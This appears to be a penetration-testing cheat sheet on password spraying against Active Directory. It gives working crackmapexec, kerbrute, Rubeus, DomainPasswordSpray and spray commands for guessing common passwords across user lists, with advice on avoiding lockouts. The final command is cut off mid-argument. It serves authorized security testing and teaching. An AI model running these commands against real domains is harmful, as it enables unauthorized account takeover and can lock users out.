# Password Spraying

## **Password Spraying**

Once you have found several **valid usernames** you can try the most **common passwords** \(keep in mind the password policy of the environment\) with each of the discovered users.  
By **default** the **minimum** **password** **length** is **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Notice that you **could lockout some accounts if you try several wrong passwords** \(by default more than 10\).

### Get password policy

If you have some user credentials or a shell as a domain user you can get the password policy with:

* `crackmapexec <IP> -u 'user' -p 'password' --pass-pol`
* `enum4linx -u 'username' -p 'password' -P <IP>`
* `(Get-DomainPolicy)."SystemAccess" #From powerview`

### Exploitation

Using **crackmapexec:**

```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

Using [kerbrute](https://github.com/TarlogicSecurity/kerbrute)\(python\) - NOT RECOMMENDED SOMETIMES DOESN'T WORK

```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```

**Kerbrute** also tells if a username is valid.

Using [kerbrute](https://github.com/ropnop/kerbrute)\(Go\)

```bash
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
```

With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:

```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

With the `scanner/smb/smb_login` module of Metasploit:

![](../../.gitbook/assets/image%20%28234%29.png)

With [Invoke-DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)

```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```

or **spray** \(read next section\).

### Lockout check

The best way is not to try with more than 5/7 passwords per account.

So you have to be very careful with password spraying because you could lockout accounts. To brute force taking this into mind, you can use _**spray:**_

```bash
apt-get install spray
spray -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPe
```

\*\*\*\*[**More information and rudimentary password spray techniques in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)\*\*\*\*

